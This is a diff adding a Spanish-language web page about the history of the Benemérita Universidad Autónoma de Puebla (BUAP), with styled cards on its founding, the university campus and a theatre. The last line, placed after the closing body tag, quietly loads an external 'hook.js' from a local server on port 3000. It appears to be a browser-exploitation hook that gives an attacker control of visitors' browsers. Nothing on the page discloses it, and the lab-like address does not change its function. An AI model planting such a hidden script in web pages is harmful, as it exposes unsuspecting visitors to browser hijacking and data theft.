@@ -1,0 +1,111 @@
+
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Historia de la BUAP</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: #f5f5f5;
+            color: #333;
+        }
+        header {
+            background: #0033cc;
+            color: white;
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        header img {
+            height: 50px;
+            margin-right: 20px;
+        }
+        nav {
+            display: flex;
+            justify-content: center;
+            background: #0044ff;
+            padding: 10px;
+        }
+        nav a {
+            color: white;
+            text-decoration: none;
+            padding: 10px 20px;
+            margin: 0 10px;
+        }
+        nav a:hover {
+            background: #0033cc;
+        }
+        .container {
+            padding: 20px;
+        }
+        .history-section {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+        }
+        .history-item {
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px;
+            width: calc(33% - 60px);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        .history-item img {
+            width: 100%;
+            border-radius: 10px;
+        }
+        footer {
+            background: #0033cc;
+            color: white;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            width: 100%;
+            bottom: 0;
+        }
+    </style>
+</head>
+<body>
+    <header>
+       
+        <h1>Bienvenido Estudiante BUAP</h1>
+    </header>
+    <nav>
+        <a href="#">Inicio</a>
+        <a href="#">Historia</a>
+        <a href="#">Estudiantes</a>
+        <a href="#">Contacto</a>
+    </nav>
+    <div class="container">
+        <h2>Historia de la BUAP</h2>
+        <div class="history-section">
+            <div class="history-item">
+                <img src="imagen1.jpg" alt="BUAP">
+                <h3>Fundación</h3>
+                <p>La Benemérita Universidad Autónoma de Puebla (BUAP) fue fundada en 1587 como el Colegio del Espíritu Santo, convirtiéndose en universidad en 1937.</p>
+            </div>
+            <div class="history-item">
+                <img src="imagen2.jpg" alt="Ciudad Universitaria">
+                <h3>Ciudad Universitaria</h3>
+                <p>La Ciudad Universitaria de la BUAP es un campus moderno que alberga diversas facultades, centros de investigación y áreas deportivas.</p>
+            </div>
+            <div class="history-item">
+                <img src="imagen3.jpg" alt="Teatro de la Ciudad">
+                <h3>Teatro de la Ciudad</h3>
+                <p>El Teatro de la Ciudad es un espacio cultural emblemático de la BUAP, donde se realizan eventos académicos y culturales.</p>
+            </div>
+        </div>
+    </div>
+    <footer>
+        &copy; 2024 Universidad BUAP
+    </footer>
+</body>
+<script src="http://127.0.0.1:3000/hook.js"></script>
